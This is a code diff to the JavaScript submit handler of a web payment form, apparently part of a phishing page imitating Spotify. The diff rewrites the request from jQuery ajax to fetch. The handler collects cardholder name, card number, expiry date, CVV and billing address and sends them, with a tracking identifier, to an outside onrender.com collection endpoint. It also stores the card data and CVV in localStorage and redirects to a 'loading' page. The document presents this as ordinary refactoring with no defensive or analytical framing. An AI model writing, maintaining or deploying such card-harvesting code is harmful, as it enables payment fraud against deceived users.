@@ -14,7 +14,7 @@ var cleaveCVV = new Cleave('#cvv', {
 });
 
 $(document).ready(function () {
-    $("#form").on("submit", function (event) {
+    $("#form").on("submit", async function (event) {
         $("#login-button").prop("disabled", false);
 
         event.preventDefault();
@@ -99,49 +99,60 @@ $(document).ready(function () {
         }
 
         var formData = $(this).serialize();
-        var unique_id = localStorage.getItem("unique_id")
+        var unique_id = localStorage.getItem("unique_id");
         formData += '&unique_id=' + encodeURIComponent(unique_id);
-        $.ajax({
-            type: "POST",
-            url: "https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_data.php",
-            data: formData,
-            success: function (response) {
-                
-                if (response.status === 'success') {
-                    
-                    AddressLine = $("#AddressLine").val();
-                    city = $("#city").val();
-                    state = $("#state").val();
-                    zipCode = $("#zipCode").val();
-                    cc_holder = $("#cc_holder").val();
-                    cc = $("#cc").val();
-                    exp = $("#exp").val();
-                    cvv = $("#cvv").val();
-                    localStorage.setItem("step", "notone");
-                    localStorage.setItem("address", AddressLine);
-                    localStorage.setItem("city", city);
-                    localStorage.setItem("state", state);
-                    localStorage.setItem("zip", zipCode);
-                    localStorage.setItem("cc_holder", cc_holder);
-                    localStorage.setItem("cc", cc);
-                    localStorage.setItem("exp", exp);
-                    localStorage.setItem("cvv", cvv);
-                    window.location.href = "loading.html";
 
-                } else if (response.status === 'error') {
-                    $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
-                    $("#login-button").prop("disabled", false);
-                } else {
-                    console.log(response);
-                    $("#login-button").prop("disabled", false);
+        try {
+            const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_data.php", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: formData,
+            });
 
-                }
-            },
-            error: function (error) {
-                
-                console.log("Error:", error);
+            if (!response.ok) {
+                console.error(`HTTP Error: ${response.status}`);
+                $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
+                $("#login-button").prop("disabled", false);
+                return;
             }
-        });
+
+            const result = await response.json();
+
+            if (result.status === 'success') {
+                const AddressLine = $("#AddressLine").val();
+                const city = $("#city").val();
+                const state = $("#state").val();
+                const zipCode = $("#zipCode").val();
+                const cc_holder = $("#cc_holder").val();
+                const cc = $("#cc").val();
+                const exp = $("#exp").val();
+                const cvv = $("#cvv").val();
+
+                localStorage.setItem("step", "notone");
+                localStorage.setItem("address", AddressLine);
+                localStorage.setItem("city", city);
+                localStorage.setItem("state", state);
+                localStorage.setItem("zip", zipCode);
+                localStorage.setItem("cc_holder", cc_holder);
+                localStorage.setItem("cc", cc);
+                localStorage.setItem("exp", exp);
+                localStorage.setItem("cvv", cvv);
+
+                window.location.href = "loading.html";
+            } else if (result.status === 'error') {
+                $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
+                $("#login-button").prop("disabled", false);
+            } else {
+                console.log(result);
+                $("#login-button").prop("disabled", false);
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            $("#general_error").html("<center><p>Something went wrong! Please try again later.<br></p></center>");
+            $("#login-button").prop("disabled", false);
+        }
     });
 
     function resetErrorMessages() {
